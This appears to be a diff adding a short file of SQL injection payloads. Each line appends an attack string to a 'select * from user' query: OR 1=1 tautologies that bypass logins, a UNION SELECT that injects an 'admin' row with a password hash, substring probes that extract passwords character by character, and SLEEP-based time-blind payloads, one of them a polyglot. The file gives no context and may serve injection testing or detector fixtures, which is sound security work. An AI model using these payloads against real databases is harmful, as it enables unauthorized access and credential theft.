@@ -1,0 +1,11 @@
+select * from user where user=root ' OR 1=1--'
+select * from user where id=1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055 
+select * from user where user=admin' and substring(password/text(),1,1)='7
+select * from user where id = 1 ' and substring(password/text(),1,1)='7 
+select * from user where id = 1 ' or 'one'='one– 
+select * from user where id = 1 ' or 1=1 limit 1 -- -+
+select * from user where id = x' or 1=1 or 'x'='y 
+select * from user where id = 1  ' or user like '%
+select * from user where id = 1  SLEEP(1)/*' or SLEEP(1) or '" or SLEEP(1) or "*/
+select * from user where id = 1  a='%' AND 8310=8310 AND '%'='
+select * from user where id = 1  ' or sleep(__TIME__)='
